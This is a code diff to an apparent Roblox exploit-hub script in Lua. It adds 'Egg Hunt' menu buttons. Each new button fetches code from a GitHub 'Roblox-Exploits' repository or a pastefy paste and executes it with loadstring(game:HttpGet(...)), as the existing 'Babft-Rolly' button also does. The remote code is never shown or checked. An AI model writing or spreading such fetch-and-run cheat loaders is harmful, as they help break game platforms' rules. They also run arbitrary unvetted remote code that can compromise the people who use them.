@@ -448,7 +448,20 @@ Tab:AddButton({
     Name = "Babft-Rolly ", 
     Callback = function() 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/XRoLLu/Rolly_Hub/main/open-source-trash-loader.exe.yeah"))() end })
-           
+
+local Section = Tab:AddSection({ 
+    Name = "2024 Egg Hunt " }) 
+
+Tab:AddButton({ 
+    Name = "Doors X Hunt",
+    Callback = function()
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))() end })
+
+Tab:AddButton({ 
+    Name = "Need More Friends x Hunt -Instant Badge",
+    Callback = function()
+       loadstring(game:HttpGet(('https://pastefy.app/O1TvLreD/raw'),true))() end })
+
 local Section = Tab:AddSection({ 
     Name = "Other Things" }) 
 
